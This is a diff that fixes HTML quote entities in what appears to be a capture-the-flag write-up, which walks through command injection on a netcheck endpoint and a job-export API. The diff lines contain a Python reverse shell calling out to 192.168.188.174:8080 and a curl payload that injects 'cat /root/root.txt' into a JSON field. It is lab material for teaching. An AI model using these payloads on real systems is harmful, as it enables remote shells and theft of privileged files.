@@ -78,7 +78,7 @@ Disallow: /status
 // TODO(ops): the staff connectivity tool at /status posts to the legacy
 // /internal/netcheck handler. Keep it out of the public nav until the new
 // auth gateway ships. Disallowed in robots.txt for now.
-console.log(&quot;Stay Noticed™&quot;);
+console.log("Stay Noticed™");
 </code></pre></div>
 
 <p>The <code>/internal/netcheck</code> endpoint was vulnerable to command injection. Testing it with:</p>
@@ -91,7 +91,7 @@ ping: usage error: Destination address required
 </code></pre></div>
 
 <p>We then used a Python reverse shell:</p>
-<div class="highlight"><pre><span></span><code>; python3 -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.188.174&quot;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;
+<div class="highlight"><pre><span></span><code>; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.188.174",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 </code></pre></div>
 
 <p>This gave us a shell and allowed us to retrieve the user flag:</p>
@@ -122,7 +122,7 @@ ping: usage error: Destination address required
 </code></pre></div>
 
 <p>The automation service was running on port <code>9000</code>. We used the key to submit a job with command injection:</p>
-<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://localhost:9000/jobs/export<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span>--data-binary<span class="w"> </span><span class="s1">&#39;{&quot;report&quot;:&quot;test;cat /root/root.txt;#&quot;}&#39;</span>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://localhost:9000/jobs/export<span class="w"> </span>-H<span class="w"> </span><span class="s1">'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a'</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">'Content-Type: application/json'</span><span class="w"> </span>--data-binary<span class="w"> </span><span class="s1">'{"report":"test;cat /root/root.txt;#"}'</span>
 </code></pre></div>
 
 <p>This retrieved the root flag:</p>
